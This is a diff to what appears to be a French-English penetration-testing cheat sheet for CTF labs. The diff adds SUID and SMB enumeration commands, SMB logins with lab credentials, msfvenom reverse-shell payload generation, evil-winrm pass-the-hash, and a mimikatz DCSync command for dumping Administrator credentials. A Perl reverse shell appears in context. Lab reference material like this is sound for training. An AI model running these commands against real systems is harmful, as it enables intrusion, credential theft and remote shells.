@@ -12,12 +12,27 @@
 sudo -l
 kernel
 
-We can then list the SUID/SGID binaries available to us by running LinEnum.sh or the following bash command:
+--> We can then list the SUID/SGID binaries available to us by running LinEnum.sh or the following bash command:
 
-```find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID```
+```find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID```  
+
+--> Script enumeration local :  
+LinEnum.sh
+
+--> Scipt enumeration à distance :  
+```enum4linux -a RHOST```
 ### Nmap
 ### FTP (File Transfer Protocol)
-### SMB
+### LDAP
+```
+ldapsearch -x -b <search_base> -H <ldap_host>
+```
+### SMB  
+```smbclient -U "SABatchJobs%SABatchJobs" -L 10.10.10.172  
+smbclient -U "SABatchJobs%SABatchJobs" \\\\10.10.10.172\\users$
+smbclient -N -L RHOST
+```
+
 ### Web
 **gobuster :** tool to bruteforce directory and file
 
@@ -136,11 +151,21 @@ perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 
 ## Exploitation
 ### msfvenom
+```
+msfvenom -p [payload] lhost=[Adresse_Kaili] lport=[Port_Kali] -f [format (exe,jsp ...)]
+msfvenom -p java/jsp_shell_reverse_tcp lhost=[Adresse_Kaili] lport=[Port_Kali] -f raw > writeup.jsp
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe > writeup.exe
+```
 ### metasploit
 ### searchsploit
 ### evil-winrm
+```
+evil-winrm -i [adresseIP] -u [USER] -H/-p [HASH/Password]
+```
 ### mimikatz
-
+```
+.\mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
+```
 
 ## Bruteforce
 ### John the ripper
